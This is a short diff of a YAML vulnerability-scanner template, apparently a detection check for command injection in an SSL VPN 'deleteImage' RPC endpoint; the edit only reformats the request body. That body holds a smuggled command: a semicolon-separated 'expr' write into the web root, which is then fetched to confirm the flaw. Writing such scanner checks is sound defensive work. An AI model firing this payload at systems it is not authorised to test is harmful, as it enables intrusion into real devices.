@@ -7,7 +7,8 @@ set:
 rules:
   - method: POST
     path: /directdata/direct/router
-    body: {"action":"SSLVPN_Resource", "method":"deleteImage", "data":[{"data":["/var/www/html/{{r1}};expr {{r3}} + {{r4}} > /var/www/html/{{r2}}"]}], "type":"rpc", "tid":17, "f8839p7rqtj":"="}
+    body: >-
+      {"action":"SSLVPN_Resource", "method":"deleteImage", "data":[{"data":["/var/www/html/{{r1}};expr {{r3}} + {{r4}} > /var/www/html/{{r2}}"]}], "type":"rpc", "tid":17, "f8839p7rqtj":"="}
     expression: response.status == 200
   - method: GET
     path: /{{r2}}
